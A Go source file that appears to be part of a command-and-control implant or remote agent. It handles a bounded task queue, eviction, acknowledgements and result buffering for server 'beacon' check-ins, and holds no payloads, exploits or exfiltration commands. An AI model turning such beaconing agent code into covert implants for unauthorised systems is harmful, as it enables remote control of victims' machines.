package main

import (
	"fmt"
)

func startTaskWorker() {
	taskWorkerOnce.Do(func() {
		for i := 0; i < defaultTaskWorkers; i++ {
			go workerLoop()
		}
	})
}

// enqueueTask hands a task to the execution pool without blocking the beacon
// goroutine. When the queue is saturated the oldest waiting task is evicted
// (and returned as an error result) so fresh commands are always accepted.
func enqueueTask(task Task) {
	if !insertTask(task) {
		// Extremely rare: the queue stayed full through the eviction attempts.
		// Ack the delivery so the server never re-fetches it, and surface a
		// terminal error so the task is not left "running" forever.
		pendingMu.Lock()
		pendingTaskAcks = append(pendingTaskAcks, task.ID)
		pendingMu.Unlock()
		enqueueResult(TaskResult{
			TaskID: task.ID,
			Type:   task.Type,
			Error:  "task not accepted: queue busy",
		})
		return
	}
	pendingMu.Lock()
	pendingTaskAcks = append(pendingTaskAcks, task.ID)
	pendingMu.Unlock()
}

// insertTask places task on the queue, freeing a slot by evicting the oldest
// waiting task first if it is full. Returns false if an empty slot could not be
// found (only possible under heavy contention).
func insertTask(task Task) bool {
	for i := 0; i < 2; i++ {
		select {
		case taskQueue <- task:
			return true
		default:
		}
		select {
		case evicted := <-taskQueue:
			evictQueuedTask(evicted)
		default:
		}
	}
	return false
}

// evictQueuedTask acks the evicted task (it was delivered) and enqueues a
// terminal error result so the server marks it failed instead of leaving it
// running forever.
func evictQueuedTask(task Task) {
	pendingMu.Lock()
	pendingTaskAcks = append(pendingTaskAcks, task.ID)
	pendingMu.Unlock()
	enqueueResult(TaskResult{
		TaskID: task.ID,
		Type:   task.Type,
		Error:  fmt.Sprintf("task evicted before start: execution queue full (%d slots)", maxQueuedTasks),
	})
}

// enqueueResult appends a task result to the pending queue, bounding it so a
// high-volume producer cannot exhaust memory. When the queue is full the oldest
// result is dropped; a single result larger than maxPendingResultBytes is
// dropped outright (it would otherwise build a beacon the server rejects).
func enqueueResult(r TaskResult) {
	pendingMu.Lock()
	defer pendingMu.Unlock()
	if len(r.Output) > maxPendingResultBytes {
		if Debug {
			fmt.Printf("[!] dropping oversized task result (type=%s size=%d)\n", r.Type, len(r.Output))
		}
		return
	}
	if len(pendingResults) >= maxPendingResults {
		pendingResults = pendingResults[1:]
	}
	pendingResults = append(pendingResults, r)
}

// enqueueResults appends several results, applying the same bounds as
// enqueueResult to each.
func enqueueResults(results []TaskResult) {
	for _, r := range results {
		enqueueResult(r)
	}
}

// reenforcePendingBounds re-applies the bounded-queue limits after a failed
// beacon splices its unsent results back onto the queue (a splice bypasses
// enqueueResult), so repeated failures cannot grow memory without bound:
// results beyond maxPendingResults and aggregate output beyond
// maxPendingResultBytes are dropped oldest-first. Caller holds pendingMu.
func reenforcePendingBounds() {
	for len(pendingResults) > maxPendingResults {
		pendingResults = pendingResults[1:]
	}
	totalBytes := 0
	for i := range pendingResults {
		totalBytes += len(pendingResults[i].Output)
	}
	for totalBytes > maxPendingResultBytes && len(pendingResults) > 0 {
		totalBytes -= len(pendingResults[0].Output)
		pendingResults = pendingResults[1:]
	}
}

func availableTaskCapacity() int {
	return cap(taskQueue) - len(taskQueue)
}
